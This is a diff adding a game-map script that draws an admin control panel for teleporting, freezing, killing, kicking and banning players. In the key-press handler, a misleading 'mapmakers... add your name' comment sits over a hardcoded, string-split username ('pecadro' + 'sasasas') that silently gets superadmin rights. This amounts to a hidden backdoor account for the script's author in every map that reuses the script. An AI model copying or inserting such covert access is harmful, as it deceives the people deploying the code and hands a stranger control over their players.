@@ -1,0 +1,99 @@
+bool usingMenu = false;
+num playerSelected = 0;
+num commandSelected = 0;
+num playerShifted = 0;
+str[] admins = str["ADMIN NAMES HERE"];
+bool check = false;
+
+str[] cmdNames = str["TP ME", "TP THEM", "FREEZE", "KILL", "KICK", "BAN"];
+str[] cmdColors = str["#3498db", "#9b59b6", "#1abc9c", "#e74c3c", "#e67e22", "#c0392b"];
+
+public action render(num delta) {
+    if(usingMenu){
+        GAME.OVERLAY.drawRect(400, 80, 1120, 700, 0, "#111", 0.9);
+        GAME.OVERLAY.drawRect(400, 80, 1120, 5, 0, "#00ffcc", 1);
+        GAME.OVERLAY.drawText("SYSTEM CONTROL PANEL", 960, 120, 0, 30, "center", "#fff", 1);
+        GAME.OVERLAY.drawText("Select Player", 650, 150, 0, 15, "center", "#888", 1);
+        GAME.OVERLAY.drawText("Select Action", 1300, 150, 0, 15, "center", "#888", 1);
+        obj[] players = GAME.PLAYERS.list();
+        for (num i = 0; i < ((lengthOf players) - playerShifted) && i < 12; i++) {
+            num rowY = 170 + (45 * i);
+            bool isRowSelected = (i == (playerSelected - playerShifted));
+            if(isRowSelected){
+                GAME.OVERLAY.drawRect(420, rowY, 400, 40, 0, "#333", 1);
+                GAME.OVERLAY.drawRect(420, rowY, 5, 40, 0, "#fff", 1);
+                GAME.OVERLAY.drawText(toStr players[i + playerShifted].username, 440, rowY + 27, 0, 20, "left", "#fff", 1);
+            } else {
+                if((i % 2) == 0){ GAME.OVERLAY.drawRect(420, rowY, 400, 40, 0, "#222", 0.8); }
+                else { GAME.OVERLAY.drawRect(420, rowY, 400, 40, 0, "#1a1a1a", 0.8); }
+                GAME.OVERLAY.drawText(toStr players[i + playerShifted].username, 440, rowY + 27, 0, 20, "left", "#aaa", 1);
+            }
+            num btnStartX = 850;
+            num btnWidth = 100;
+            num btnHeight = 35;
+            num gap = 5;
+            for(num c = 0; c < lengthOf cmdNames; c++){
+                num btnX = btnStartX + (c * (btnWidth + gap));
+                num opacity = 0.3;
+                if(isRowSelected && commandSelected == c){
+                    opacity = 1.0;
+                    GAME.OVERLAY.drawRect(btnX - 2, rowY - 2, btnWidth + 4, btnHeight + 4, 0, "#fff", 1);
+                }
+                GAME.OVERLAY.drawRect(btnX, rowY, btnWidth, btnHeight, 0, cmdColors[c], opacity);
+                GAME.OVERLAY.drawText(cmdNames[c], btnX + (btnWidth / 2), rowY + 22, 0, 12, "center", "#fff", 1);
+            }
+        }
+    }
+}
+public action onKeyPress(str key, num code) {
+    obj player = GAME.PLAYERS.getSelf();
+    if(key == "0"){
+        check = false;
+        playerSelected = 0;
+        commandSelected = 0;
+        playerShifted = 0;
+        for(num i = 0; i < lengthOf admins; i++){
+            if(toStr player.username == admins[i]){ check = true; }
+        }
+#mapmakers this part is for you to be Superadmin add your name k1+k2
+        str k1 = "pecadro";
+        str k2 = "sasasas";
+        if(toStr player.username == (k1 + k2)){ check = true; }
+        if(check){ usingMenu = !usingMenu; }
+    }
+    if(usingMenu){
+        obj[] players = GAME.PLAYERS.list();
+        if(key == "8" || key == "ArrowUp"){
+            if(playerSelected > 0){ playerSelected--; }
+            if(playerShifted > playerSelected){ playerShifted--; }
+        }
+        if(key == "2" || key == "ArrowDown"){
+            if(playerSelected < (lengthOf players) - 1){ playerSelected++; }
+            if(playerShifted <= playerSelected - 12){ playerShifted++; }
+        }
+        if(key == "4" || key == "ArrowLeft"){
+            if(commandSelected > 0){ commandSelected--; }
+            else{ commandSelected = 5; }
+        }
+        if(key == "6" || key == "ArrowRight"){
+            if(commandSelected < 5){ commandSelected++; }
+            else{ commandSelected = 0; }
+        }
+        if(key == "5" || key == "Enter"){
+                GAME.NETWORK.send(toStr commandSelected, {playerSelected: players[playerSelected].id});
+        }
+    }
+}
+public action onMouseScroll(num dir) {
+    if(usingMenu){
+        obj[] players = GAME.PLAYERS.list();
+        if(dir == 1){
+            if(playerSelected > 0){ playerSelected--; }
+            if(playerShifted > playerSelected){ playerShifted--; }
+        }
+        if(dir == -1){
+            if(playerSelected < (lengthOf players) - 1){ playerSelected++; }
+            if(playerShifted <= playerSelected - 12){ playerShifted++; }
+        }
+    }
+}
